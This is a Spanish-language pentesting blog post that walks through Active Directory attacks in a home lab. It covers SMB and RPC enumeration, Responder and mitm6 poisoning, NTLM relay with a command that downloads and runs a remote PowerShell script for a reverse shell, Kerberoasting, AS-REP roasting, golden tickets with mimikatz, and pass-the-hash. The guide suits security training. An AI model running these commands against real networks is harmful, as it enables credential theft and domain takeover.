<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

<link rel="icon" href="/assets/images/logo.png">

<title>Pentesting Active Directory | thespartoos</title>

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Pentesting Active Directory | Alejandro Ruiz</title>
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Pentesting Active Directory" />
<meta name="author" content="thespartoos" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Este artículo engloba una enorme y extensa guía de ataques que se pueden realizar en un entorno de Directorio Activo Para practicar todo este tipo de ataques te recomiendo que te montes un laboratorio para puedas poner en practica todo lo que se va a tocar en la guía, por lo tanto los sistemas que vas a necesitar son:" />
<meta property="og:description" content="Este artículo engloba una enorme y extensa guía de ataques que se pueden realizar en un entorno de Directorio Activo Para practicar todo este tipo de ataques te recomiendo que te montes un laboratorio para puedas poner en practica todo lo que se va a tocar en la guía, por lo tanto los sistemas que vas a necesitar son:" />
<link rel="canonical" href="http://localhost:4000/Pentesting-Active-Directory/" />
<meta property="og:url" content="http://localhost:4000/Pentesting-Active-Directory/" />
<meta property="og:site_name" content="Alejandro Ruiz" />
<meta property="og:image" content="https://hlassets.paessler.com/common/files/graphics/monitoring-topics/active-directory-monitoring.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-03-28T00:00:00+02:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://hlassets.paessler.com/common/files/graphics/monitoring-topics/active-directory-monitoring.png" />
<meta property="twitter:title" content="Pentesting Active Directory" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"thespartoos"},"dateModified":"2022-03-28T00:00:00+02:00","datePublished":"2022-03-28T00:00:00+02:00","description":"Este artículo engloba una enorme y extensa guía de ataques que se pueden realizar en un entorno de Directorio Activo Para practicar todo este tipo de ataques te recomiendo que te montes un laboratorio para puedas poner en practica todo lo que se va a tocar en la guía, por lo tanto los sistemas que vas a necesitar son:","headline":"Pentesting Active Directory","image":"https://hlassets.paessler.com/common/files/graphics/monitoring-topics/active-directory-monitoring.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Pentesting-Active-Directory/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/thespartoos.png"},"name":"thespartoos"},"url":"http://localhost:4000/Pentesting-Active-Directory/"}</script>
<!-- End Jekyll SEO tag -->

    
<link href="/assets/css/prism.css" rel="stylesheet">

<link href="/assets/css/theme.css" rel="stylesheet">

<script src="/assets/js/jquery.min.js"></script>

</head>




<body>
	<!-- defer loading of font and font awesome -->
	<noscript id="deferred-styles">
		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
	</noscript>

<!-- Begin Sidebar Navigation
================================================== -->

<div class="sidebar">    
</div>   
<div class="nav-icon">
    <div class="hamburger-bar"></div>
</div>
<div id="blackover-nav" class="blackover"></div>
<nav id="menu">
    <ul>
        <h3>Menú</h3>
        <li><a href="/">Home</a></li>
        <li><a href="/categories">Artículos   <span class="badge badge-primary">nuevo</span></a></li>
	<li><a href="/tags">Etiquetas</a></li>
	<li><a href="/about">Sobre mi</a></li>
    </ul>   
</nav>

<!-- Share
===================== -->

<div class="share">
    <ul>
        <li class="ml-1 mr-1">
            <a target="_blank" href="https://twitter.com/thespartoos" style="color: #00aef3;">
                <i class="fab fa-twitter"></i>
            </a>
        </li>

        <li class="ml-1 mr-1">
            <a target="_blank" href="https://github.com/thespartoos" style="color: white;">
                <i class="fab fa-github"></i>
            </a>
        </li>

        <li class="ml-1 mr-1">
            <a target="_blank" href="https://www.hackthebox.com/home/users/profile/435714">
                <script src="https://code.iconify.design/2/2.2.0/iconify.min.js"></script>
                <span class="iconify" data-icon="simple-icons:hackthebox" style="color: #2bff2b;"></span>
            </a>
        </li>

    </ul>
</div>

<script src="/assets/js/lunr.js"></script>

<style>
    
</style>

<div class="wrap-search">
    <div class="d-flex align-items-center ml-auto">
        <i class="fas fa-search show-search"></i>
        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Type and enter..."/>
        </form>
    </div>
</div>

<div id="lunrsearchresults">
    <ul></ul>
</div>

<script src="/assets/js/lunrsearchengine.js"></script>


<!-- End Sidebar Navigation
================================================== -->

<div class="site-content ">

<div class="container">

    <!-- Site Logo/Name
    ================================================== -->
   
    <a class="navbar-brand" href="/">
        <img src="/assets/images/thespartoos.png" alt="thespartoos">
    </a>  
   

    <!-- Site Tag
    ================================================== -->
    

    <!-- Content
    ================================================== -->
    <div class="main-content">
        <div class="entry-header">
    <!-- Post Title -->
    <h1 class="posttitle">Pentesting Active Directory</h1>
    <!-- Author & Date  Box -->
    
    
    <div class="d-flex align-items-center mt-4">
        <div>
            
            <img class="author-thumb" src="/assets/images/thespartoos.png" alt="Thespartoos">
            
        </div>            
        <div>
        Written by Thespartoos on 
        <span class="post-date"><time class="post-date" datetime="2022-03-28">28 Mar 2022</time></span>           
        
        </div>            
    </div>
    
</div>

<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->


<!-- Featured Image -->

<div class="entry-featured-image">
    
    <img class="featured-image " src="https://hlassets.paessler.com/common/files/graphics/monitoring-topics/active-directory-monitoring.png" alt="Pentesting Active Directory">
    
</div>


<!-- Content -->
<!-- Post, Page Content
================================================== -->
<div class="article-post">
    <!-- Toc if any -->
    
    
        <p><em>Este artículo engloba una enorme y extensa guía de ataques que se pueden realizar en un entorno de Directorio Activo</em></p>
    
    <div class="toc mt-4 mb-4 lead">
        <h3 class="font-weight-bold">Summary</h3>
        <ul>
  <li><a href="#este-artículo-engloba-una-enorme-y-extensa-guía-de-ataques-que-se-pueden-realizar-en-un-entorno-de-directorio-activo"><strong>Este artículo engloba una enorme y extensa guía de ataques que se pueden realizar en un entorno de Directorio Activo</strong></a></li>
  <li><a href="#enumerar-usuarios-del-sistema">Enumerar usuarios del sistema</a>
    <ul>
      <li><a href="#smbclient-y-smbmap">SMBCLIENT Y SMBMAP</a></li>
      <li><a href="#rpcclient">RPCCLIENT</a></li>
      <li><a href="#ldapdomaindump">LDAPDOMAINDUMP</a></li>
    </ul>
  </li>
  <li><a href="#ataques-directorio-activo">ATAQUES DIRECTORIO ACTIVO</a>
    <ul>
      <li><a href="#smb-relay">SMB RELAY</a></li>
      <li><a href="#kerberoasting">KERBEROASTING</a></li>
      <li><a href="#asreproast">ASREPROAST</a></li>
      <li><a href="#goldenticket-attack">GOLDENTICKET ATTACK</a></li>
    </ul>
  </li>
  <li><a href="#bloodhound">BLOODHOUND</a></li>
  <li><a href="#maneras-acceder-equipos">MANERAS ACCEDER EQUIPOS</a></li>
</ul>
    </div>
    
    <!-- End Toc -->
    <h2 id="este-artículo-engloba-una-enorme-y-extensa-guía-de-ataques-que-se-pueden-realizar-en-un-entorno-de-directorio-activo"><strong>Este artículo engloba una enorme y extensa guía de ataques que se pueden realizar en un entorno de Directorio Activo</strong></h2>
<p>Para practicar todo este tipo de ataques te recomiendo que te montes un laboratorio para puedas poner en practica todo lo que se va a tocar en la guía, por lo tanto los sistemas que vas a necesitar son:</p>

<ul>
  <li>Windows Server 2016</li>
  <li>Windows 10
<br /></li>
</ul>

<h2 id="enumerar-usuarios-del-sistema">Enumerar usuarios del sistema</h2>

<p>Considero que mostrar en la guía instalar los sistemas operativos e implementar los equipos al dominio creo que no es necesario. En el caso que no sepais os lo dejo en vuestras manos ya que también hay que aprender a investigar y eso lo debes de aprender por tu cuenta</p>

<h3 id="smbclient-y-smbmap">SMBCLIENT Y SMBMAP</h3>

<p>Con estas herramienta podemos listar recursos compartidos a nivel de red a través del protocolo samba para poder enumerar este servicio debe de estar el puerto abierto el cual podemos escanear de varias formas</p>

<p><strong>Listar recuros compartidos sin conocer credenciales</strong></p>

<pre><code class="language-bash">smbclient -L 192.168.213.136 -N
</code></pre>
<p>En el caso de que no salgan recursos es necesario requerir de credenciales o si es otro tipo de error en el samba deberemos de especificar el siguiente parámetro</p>
<pre><code class="language-bash">smbclient -L 192.168.213.136 -N --option='client min protocol=NT1'
</code></pre>

<p>Entrar en modo interactivo para ver el contenido de una carpeta compartida con smbclient</p>
<pre><code class="language-bash">smbclient //192.168.213.136/ShareFolder -N 
</code></pre>

<p>Ver el contenido de una carpeta compartida con smbclient utilizando contraseña</p>
<pre><code class="language-bash">smbclient //192.168.213.136/ShareFolder -U "admin%password123"
</code></pre>

<p>Para leer archivos compartidos del sistema también podemos utilizar <strong>smbmap</strong> con la que a demás podemos ver los permisos</p>
<pre><code class="language-bash">smbmap -H 192.168.213.136 -u 'null'
</code></pre>

<p>Ver el contenido de una carpeta con smbmap</p>
<pre><code class="language-bash">smbmap -H 192.168.213.136 -r 'ShareFolder'
</code></pre>

<p>Ver los recursos compartidos con smbmap utilando contraseña</p>
<pre><code class="language-bash">smbmap -H 192.168.213.136 -u 'admin' -p 'password123'
</code></pre>
<h3 id="rpcclient">RPCCLIENT</h3>

<p>Con esta herramienta vas a poder información de una máquina como por ejemplo usuarios del sistema, grupos…</p>

<p>Para poder conectarte y poder enumerar debemos de ejecutar la siguiente sentencia:</p>
<pre><code class="language-bash">rpcclient -U "" 192.168.213.135 ➡️  Sin contraseña
rpcclient -U "alejandrocorp.local\alejandro%Password1" ➡️  Con contraseña
</code></pre>

<p>Si queremos enumerar los usuarios del dominio podemos realizarlo con esta sentencia en una misma línea:
<img src="/assets/images/Active-Directory/rpc.png" /></p>

<p>Cada usuario tiene un rid a través del cual podemos saber en que grupos se encuentra y mas información al respecto:
<img src="/assets/images/Active-Directory/enumusers.png" /></p>

<p>Ejecutando la siguiente sentencia veremos información acerca del usuario que escogimos a través del rid</p>

<p><img src="/assets/images/Active-Directory/queryuser.png" /></p>

<p>Sentencia para enumerar información completa de usuarios en una sola linea</p>
<pre><code class="language-bash">for rid in $(rpcclient -U "s4vicorp.local\alejandro%Password1" 192.168.213.135 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' |tr -d '[]'); do echo "\n[+] para el RID: $rid\n"; rpcclient -U "s4vicorp.local\alejandro%Password1" 192.168.213.135 -c "queryuser $rid" |grep -E -i "user name|description" ; done
</code></pre>

<p>Podemos ver los grupos que se encuentran a nivel de dominio</p>

<p><img src="/assets/images/Active-Directory/grupos.png" /></p>

<p>Dentro de esos grupos se encuentran los rid de los usuarios los cuales podemos enumerar con el siguiente comando:</p>

<p><img src="/assets/images/Active-Directory/usersgrupos.png" /></p>

<h3 id="ldapdomaindump">LDAPDOMAINDUMP</h3>

<p>Si no quereis hacer lo que hemos hecho con rpcclient podemos utilizar esta herramienta que nos automatiza el proceso de enumerar la cual vía web te representa toda la información estructurada</p>

<p>Esta herramienta es de github ➡️  : <a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a></p>

<p>Nos la clonamos el repositorio y nos vamos a la ruta /var/www/html, en donde iniciamos el servicio apache2 y después ejecutamos el siguiente comando y abrimos el navegador y ponemos <strong>localhost</strong></p>

<pre><code class="language-bash">python3 /opt/ldapdomaindump/ldapdomaindump.py -u 's4vicorp.local\alejandro' -p 'Password1' 192.168.213.135
</code></pre>

<h2 id="ataques-directorio-activo">ATAQUES DIRECTORIO ACTIVO</h2>

<h3 id="smb-relay">SMB RELAY</h3>

<p>⚠️  Este ataque solo funciona si los equipos de la red no utilizan samba firmando, que os aseguro que la mayoría de empresas no lo tienen</p>

<p>Este ataque consiste en envenenar tráfico, y como no esta firmado no se logra validar la legitimidad del origen nos enviará su hash NTLMV2 ya que se autentica contra nostros</p>

<p><code>IPV4</code></p>

<p>Bueno para poder envenenar el tráfico por IPV4 es necesario de prescindir del Responder.py en la mayoría de sistemas de pentesting aparece instalado en la ruta “/usr/share/Responder”</p>

<pre><code class="language-bash">python3 responder.py -I eth0 -wv
</code></pre>

<p>Una vez ejecutado el comando ya está envenando en el momento que alguién busque un recurso compartido que no exista tendremos el hash NTLMv2</p>

<p><img src="/assets/images/Active-Directory/responder.png" /></p>

<p>Copiamos ese hash NTLMv2 y vamos a crackear el hash con john, si la contraseña es lo suficientemente poco segura la podremos sacar. Una vez sacada la deberemos de validar con la herramienta <code>crackmapexec</code></p>

<p><img src="/assets/images/Active-Directory/hash.png" /></p>

<p>Si nos pone un <strong><code>(Pwned!)</code></strong> podremos ejecutar comandos en la máquina porque la contraseña es privilegiada. En ese caso podemos realizar otro ataque de envenenamiento por el que vamos a poder dumpear la sam del equipo o ejecutar cualquier otro comando.</p>

<p>Vamos a volver a envenenar el tráfico, pero esta vez vamos a <strong>editar el Responder.conf para poner [SMB=Off, HTTP=Off]</strong>, después ejecutamos la siguiente herramienta con los siguientes parámetros</p>

<p><img src="/assets/images/Active-Directory/ntlmrelayx.png" /></p>

<p>En el momento en el que se autentique va a ejecutar ese mismo comando aprovechandose de ese autenticación y nos dumpea la sam. También podemos especificar comandos a ejecutar con el siguiente comando:</p>

<p>Por ejemplo ejecutarse un archivo de powershell que te entable una reverse_shell</p>

<pre><code class="language-bash">ntlmrelayx.py -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/PS.ps1')"
</code></pre>

<p><code>IPV6</code></p>

<p>Para poder envenenar el tráfico por IPV6 deberemos de utilizar la herramienta <code>mitm6</code> para a través de ella envenenar el DNS, la puerta de enlace y demás para que posteriormente en el momento que busquen un recurso compartido que no exista y el hash del usuario es privilegiado podremos ejecutar comandos</p>

<p>Envenenamos la red:</p>

<pre><code class="language-bash">mitm6 -d &lt;dominio&gt;
</code></pre>
<p>Ahora para que nos pille esa comunicación entraremos en modo interactivo y utilizando socks para posteriormente si es privilegiado ejecutar comandos a través de proxychains</p>

<pre><code class="language-bash">ntlmrelayx.py -6 -wh kali-IP -t smb://192.168.94.138 -socks -debug -smb2support
</code></pre>

<p>En el modo interactivo podemos limpiar la pantalla con “CTRL + L”. Para poder ver los usuarios que interceptó debemos de ejecutar el comando <code>socks</code></p>

<p><img src="/assets/images/Active-Directory/ipv6.png" /></p>

<p>Vemos que pone <strong>TRUE</strong> por lo tanto podemos configurar proxychains para redirigir esa autenticación que al ser privilegiada podamos ejecutar comandos. Para configurar proxychains nos vamos a editar el fichero <code>/etc/proxychains.conf</code></p>

<p><img src="/assets/images/Active-Directory/proxy.png" /></p>

<p>Una vez editado para poder ejecutar comandos simplemente vamos a validar que la autenticación es válida para ello ejecutamos el siguiente comando:</p>

<pre><code class="language-bash">proxychains cme smb IP -u 'mvazquez' -p 'nonecesitassaberla' -d 's4vicorp' 2&gt;/dev/null
</code></pre>

<h3 id="kerberoasting">KERBEROASTING</h3>

<p>Para este ataque se utiliza para conocer es necesario de conocer credenciales válidas. Consiste en conocer usuarios que sean kerberoasteables para obtener su hash TGS y poder crackearlo</p>

<p><img src="/assets/images/Active-Directory/kerberos.png" /></p>

<p>Este ataque se puede hacer también desde un equipo de dominio con rubeus. Si tu tienes un equipo al que tienes acceso puedes descargarte <code>rubeus.exe</code> de github un compiled-binarie, con el que lo traspasamos a la máquina y lo ejecutamos haciendo la siguiente sentencia:</p>

<pre><code class="language-bash">Rubeus.exe kerberoast /creduser:s4vicorp.local\alejandro /credpassword:Password1
</code></pre>

<h3 id="asreproast">ASREPROAST</h3>

<p>Para este ataque no se requiere de que conozcas las contraseñas pero necesitas tener un listado de usuarios válidos y funciona cuando un usuario a nivel de configuración tiene asignado <code>No pedir autenticación de kerberos previa</code>. Simplemente tienes que ejecutar el siguiente comando</p>

<p><img src="/assets/images/Active-Directory/asep.png" /></p>

<p>Como vemos obtenemos de nuevo el TGS que con el podemos crackear la contraseña con john</p>

<p>Este ataque se puede hacer también desde un equipo de dominio con rubeus. Si tu tienes un equipo al que tienes acceso puedes descargarte <code>rubeus.exe</code> de github un compiled-binarie, con el que lo transferimos a la máquina que tengamos acceso y lo ejecutamos</p>

<pre><code class="language-bash">Rubeus.exe asreproast /user:SVC_SQLservice /domain:s4vicorp.local /dc:DC-Company
</code></pre>

<h3 id="goldenticket-attack">GOLDENTICKET ATTACK</h3>

<p>Este ataque es util para escalar privilegios haciendo un pass the ticket obteniendo información del usuario krbtgt contruyendo un goldenticket. Lo primero que debemos de hacer es tener acceso a un equipo para subirle el <code>mimikatz.exe</code>.</p>

<p>Una vez que hemos subido el mimikatz vamos a ejecutarlo aplicando el siguiente comando que nos dará información del usuario krbtgt</p>

<p><img src="/assets/images/Active-Directory/mimikatz.png" /></p>

<p>Toda la información que nos arroja la copiamos para guardarla ya que nos vamos a construir un golden ticket. Una vez copiada volvemos al mimikatz de la máquina y ponemos el siguiente comando rellenando los siguientes datos que se guardaron en lo que nos copiamos antes</p>

<pre><code class="language-bash">kerberos::golden /domain:s4vicorp.local /sid:&lt;SID&gt; /rc4:&lt;NTLM&gt; /user:Administrador /ticket:golden.kirbi
</code></pre>

<p><img src="/assets/images/Active-Directory/mimikatz2.png" /></p>

<p>Genial como vemos se nos guardó un golden.kirbi, ahora nos podemos conectar con otro usuario en otro equipo si es privilegiado y desde <code>mimikatz</code> le podemos importar ese golden.kirbi para que pueda leer recursos compartidos privilegiados a nivel de red</p>

<pre><code class="language-bash">kerberos::ptt golden.kirbi
</code></pre>

<p>Una vez hecho eso si por ejemplo intentamos listar el contenido privilegiado del DC, podremos verlo (“dir \DC-Company\c$” o dir “\DC-Company\admin$”)</p>

<p>Pero esto apenas es nada también podríamos jugar con la herramienta <code>ticketer.py</code> de nuestro equipo local con la que podemos generar un goldenticket y poder hacer pass the hash para poder conectarnos sin contraseña.</p>

<p>Simplemente desde nuestro equipo ejecutamos el siguiente comando con los datos que recopilamos anteriormente con <strong>mimikat</strong>:</p>

<p><img src="/assets/images/Active-Directory/ticketer.png" /></p>

<p>Ahora se nos habrá creado un archivo llamado “Administrador.ccache” y el siguiente paso será exportar una variable de entorno para que lo utilice ese archivo y poder conectarnos sin contraseña</p>

<pre><code class="language-bash">export KRB5CCNAME="/home/alejandro/Escritorio/Laboratorio/AD/Administrador.ccache"
</code></pre>

<p>Una vez exportada simplemente para conectarnos al DC como administrador podemos ejecutar el siguiente comando sin contraseña</p>

<p><img src="/assets/images/Active-Directory/golden.png" /></p>

<h2 id="bloodhound">BLOODHOUND</h2>

<p>Bueno esta herramienta es una locura que todo pentester debe de utilizar en una auditoría ya que sirve para enumerar vías potenciales de como conseguir ser Administrador.</p>

<p>Para poder instalarla:</p>

<pre><code class="language-bash">sudo apt install neo4j bloodhound -y
</code></pre>

<p>Tendreis que configurarlo antes el bloodhound para poder acceder con usuario y contraseña. Para poder iniciarlo primero ejecutamos <code>neo4j console</code> y luego abrimos el <code>bloodhound</code></p>

<p>Una vez que hayais accedido ya al bloodhound seteando la contraseña vamos a utilizar un script en powershell <code>SharpHound.ps1</code>, lo podemos buscar en github, el cual servirá para que nos recoja información del sistema y que la almacene en un .zip</p>

<p>Una vez tengamos el script <strong>SharpHound</strong> vamos a conectarnos con una powershell hay varias formas ya sea porque teneis acceso a través de winrm o desde una cmd entablarse una powershell. Subimos el archivo:</p>

<pre><code class="language-powershell">IEX(New-Object Net.WebClient).downloadString('http://192.168.213.129/SharpHound.ps1')
</code></pre>

<p>Y luego para hacer que se ejecute el scritp ejecutamos la siguiente sentencia</p>

<pre><code class="language-powershell">Invoke-BloodHound -CollectionMethod All
</code></pre>

<p>Después de eso se nos creará un archivo .zip el cual lo transferiremos a nuestra máquina y posteriormente lo importaremos en el bloodhound.</p>

<p><strong>En el caso de que no tengamos acceso al equipo</strong> podemos ejecutar <code>bloodhound-python</code> el cual se instala:</p>

<pre><code class="language-bash">sudo apt install bloodhound-python o pip3 install bloodhound
</code></pre>

<p>Una vez tengamos la herramienta bloodhound-python podemos realizar lo mismo pero desde nuestro equipo local ejecutando el siguiente comando:</p>

<p><img src="/assets/images/Active-Directory/bloodhound.png" /></p>

<p>Se nos generan unos archivos <code>.json</code> los cuales importaremos a nuestro bloodhound para enumerar</p>

<h2 id="maneras-acceder-equipos">MANERAS ACCEDER EQUIPOS</h2>

<ul>
  <li>
    <p>Con contraseña ➡️  <code>psexec.py s4vicorp.local/Administrador:P@\$\$w0rd\!@192.168.213.135 cmd.exe</code></p>
  </li>
  <li>
    <p>Pass the hash ➡️  <code>wmiexec.py s4vicorp.local/mvazquez@192.168.213.135 -hashes hash</code></p>
  </li>
</ul>

</div>

<!-- Rating -->


<!-- Author Box if enabled from _config.yml -->
<!-- Author Box -->


<div class="authorbox mb-5 mt-5 pt-4 pb-4">   
    <div class="row">
        <div class="wrapavname col-md-3 text-center">
            
            <img  class="author-thumb" src="/assets/images/thespartoos.png" alt="Thespartoos">
            
            <p class="mt-4 mb-0 small text-center">
                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://thespartoos.github.io"><i class="fa fa-link"></i></a> 
                <a target="_blank" class="d-inline-block mx-1 text-dark" href="https://twitter.com/thespartoos"><i class="fab fa-twitter"></i></a>
                <a class="d-inline-block mx-1 text-dark" href="mailto:"><i class="fa fa-envelope"></i></a>
            </p>
        </div>
        <div class="col-md-9">
            <h4>Thespartoos</h4>
            <p class="mt-3 mb-0">Creador del Blog de Ciberseguridad</p>
        </div>
    </div> 
</div> 



<!-- Comments if not disabled with comments: false -->
<!-- Comments
================================================== -->
 
<div class="comments mt-5">
    <div id="comments">  
        <h4 class="mb-4">Comments</h4>                 
            <section class="disqus">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        var disqus_shortname = 'demowebsite'; 
        var disqus_developer = 0;
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</section>
     
    <div class="clearfix"></div>              
    </div>    
</div>       



<!-- Share -->
<div class="share">
    <ul>
        <li class="ml-1 mr-1">
            <a target="_blank" href="https://twitter.com/thespartoos" style="color: #00aef3;">
                <i class="fab fa-twitter"></i>
            </a>
        </li>

        <li class="ml-1 mr-1">
            <a target="_blank" href="https://github.com/thespartoos" style="color: white;">
                <i class="fab fa-github"></i>
            </a>
        </li>

        <li class="ml-1 mr-1">
            <a target="_blank" href="https://www.hackthebox.com/home/users/profile/435714">
		<script src="https://code.iconify.design/2/2.2.0/iconify.min.js"></script>
		<span class="iconify" data-icon="simple-icons:hackthebox" style="color: #2bff2b;"></span>
            </a>
        </li>

    </ul>
</div>


<!-- Related Post -->
<!-- Related Posts
================================================== -->
<div class=" related-posts ">  

    
    <h2 class="text-center mb-4">Explore more like this</h2>
    
    
    <div class="d-flex justify-content-center align-items-center">
    
    <!-- Categories -->
    
    
    <a class="smoothscroll badge badge-primary text-capitalize" href="/categories#Articulo">Articulo</a>                
    

    <!-- Tags -->  
    
                    
    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#AD">AD</a>               
                    
    <a class="smoothscroll badge badge-primary text-capitalize" href="/tags#Windows">Windows</a>               
    

    </div>

    
    
    
    <div class="blog-grid-container">
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
            <!-- begin post -->


<div class="blog-grid-item">
    <div class="card h-100">
        <div class="maxthumb">
            <a href="/Ver-Canales-de-pago/">
                

                    
                        <img class="img-thumb" src="/assets/images/Parabolica/parabolica-imagen.png" alt="Ver canales de pago (GRATIS)"> 
                    

                
            </a>
        </div>
        <div class="card-body">
            <h2 class="card-title">
                <a class="text-dark" href="/Ver-Canales-de-pago/">Ver canales de pago (GRATIS)</a>
                
            </h2>
            <h4 class="card-text">¿Como puedo ver canales de pago gratis? Antes de comenzar con el procedimiento de como realizar los pasos vamos a comenzar con la explicación lógica que nos va a servir...</h4>
        </div>
        <div class="card-footer bg-white">
            <div class="wrapfooter">
                
                <span class="meta-footer-thumb">
                
                <img class="author-thumb" src="/assets/images/thespartoos.png" alt="Thespartoos">
                
                </span>
                <span class="author-meta">
                <span class="post-name font-weight-bold">Thespartoos</span> 
                
                <span class="post-date">20 Dec 2021</span>
                </span>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<!-- end post -->
            
            
            
        
        
        
            
            
        
            
        
            
            <!-- begin post -->


<div class="blog-grid-item">
    <div class="card h-100">
        <div class="maxthumb">
            <a href="/Analisis-de-servicios-y-puertos/">
                

                    
                        <img class="img-thumb" src="/assets/images/Analisis-de-servicios-y-puertos/nmap.jpg" alt="Host and Port Discovery"> 
                    

                
            </a>
        </div>
        <div class="card-body">
            <h2 class="card-title">
                <a class="text-dark" href="/Analisis-de-servicios-y-puertos/">Host and Port Discovery</a>
                
            </h2>
            <h4 class="card-text">BIENVENIDOS A MI PRIMER POST Aquí puedes aprender como enumerar puertos y como descubrir hosts activos en red utilizando una serie de utilidades, algunas diseñadas y otras son creadas manualmente...</h4>
        </div>
        <div class="card-footer bg-white">
            <div class="wrapfooter">
                
                <span class="meta-footer-thumb">
                
                <img class="author-thumb" src="/assets/images/thespartoos.png" alt="Thespartoos">
                
                </span>
                <span class="author-meta">
                <span class="post-name font-weight-bold">Thespartoos</span> 
                
                <span class="post-date">16 Aug 2021</span>
                </span>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<!-- end post -->
            
            
            
        
        
        </div>        
</div>

<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
https://search.google.com/structured-data/testing-tool/u/0/
================================================== -->

    </div>

    
    <!-- Newsletter
    ==================================================
    <div class="newsletter text-center">
        <span class="h4"><img src="/assets/images/thespartoos.png" class="newsletter-logo" alt="Alejandro Ruiz"> &nbsp; Never miss a <b>story</b> from us, subscribe to our newsletter</span>
        <form action="https://wowthemes.us11.list-manage.com/subscribe/post?u=8aeb20a530e124561927d3bd8&amp;id=8c3d2d214b" method="post" name="mc-embedded-subscribe-form" class="wj-contact-form validate" target="_blank" novalidate>
            <div class="mc-field-group d-inline-flex">
            <input type="email" placeholder="Your e-mail" name="EMAIL" class="required email" id="mce-EMAIL" autocomplete="on" required>
            <input type="submit" value="Subscribe" name="subscribe" class="heart">
            </div>
        </form>
    </div> -->
    
    
</div>

<!-- Begin Footer
================================================== -->
<footer class="footer">
    <div class="container">
        <div class="row">
            <div class="col-md-6 col-sm-12 text-center text-lg-left">
                Copyright © 2022 thespartoos 
            </div>
            <div class="col-md-6 col-sm-12 text-center text-lg-right">  
                <!--<a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net -->
            </div>
        </div>
    </div>
</footer>
<!-- End Footer
================================================== -->

</div> <!-- /.site-content -->

<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
================================================== -->

<script src="/assets/js/prism.js"></script>

<script src="/assets/js/theme.js"></script>




<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>


</body>
</html>
